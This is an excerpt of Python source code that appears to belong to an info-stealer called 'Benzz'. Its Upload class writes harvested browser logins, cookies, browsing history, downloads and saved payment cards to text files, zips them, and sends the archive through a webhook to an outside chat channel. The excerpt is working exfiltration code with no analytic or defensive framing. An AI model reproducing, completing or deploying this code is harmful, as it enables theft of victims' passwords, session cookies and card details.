...
class Upload:
    ...
    def write_files(self):
        os.makedirs("benzz", exist_ok=True)
        if __LOGINS__:
            with open("benzz\\logins.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __LOGINS__))

        if __COOKIES__:
            with open("benzz\\cookies.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __COOKIES__))

        if __WEB_HISTORY__:
            with open("benzz\\web_history.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __WEB_HISTORY__))

        if __DOWNLOADS__:
            with open("benzz\\downloads.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __DOWNLOADS__))

        if __CARDS__:
            with open("benzz\\cards.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __CARDS__))

        with ZipFile("benzz.zip", "w") as zip:
            for file in os.listdir("benzz"):
                zip.write(f"benzz\\{file}", file)
    ...
    def send(self):
        self.webhook.send(
            embed=Embed(
                title="benzz",
                description="```" +
                '\n'.join(self.tree(Path("benzz"))) + "```",
            ),
            file=File("benzz.zip"),
            username="Benzz",
            avatar_url="https://i.imgur.com/LRfogYP.jpg"
        )
